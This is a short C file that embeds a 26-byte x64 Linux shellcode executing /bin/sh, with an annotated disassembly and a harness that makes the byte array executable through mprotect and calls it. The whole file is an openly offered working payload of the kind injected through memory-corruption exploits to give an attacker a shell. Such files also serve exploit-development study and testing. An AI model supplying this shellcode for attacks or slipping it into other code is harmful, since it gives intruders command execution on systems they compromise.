#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

/*

x64 execve /bin/sh -- 26 Bytes -- 17MAY021 -- icon

0:  48 31 c0                xor    rax,rax
3:  50                      push   rax
4:  5a                      pop    rdx
5:  50                      push   rax
6:  48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f2f6e69622f
d:  2f 73 68
10: 51                      push   rcx
11: 48 89 e7                mov    rdi,rsp
14: 50                      push   rax
15: 5e                      pop    rsi
16: b0 3b                   mov    al,0x3b
18: 0f 05                   syscall
*/

char execve_sh[] = "\x48\x31\xC0\x50\x5A\x50\x48\xB9\x2F\x62\x69\x6E\x2F\x2F"
                   "\x73\x68\x51\x48\x89\xE7\x50\x5E\xB0\x3B\x0F\x05";

int main(int argc, char **argv) {

  mprotect((void *)((intptr_t)execve_sh & ~0xFFF), 8192, PROT_READ | PROT_EXEC);

  int (*test)() = (int (*)())execve_sh;
  test();
}
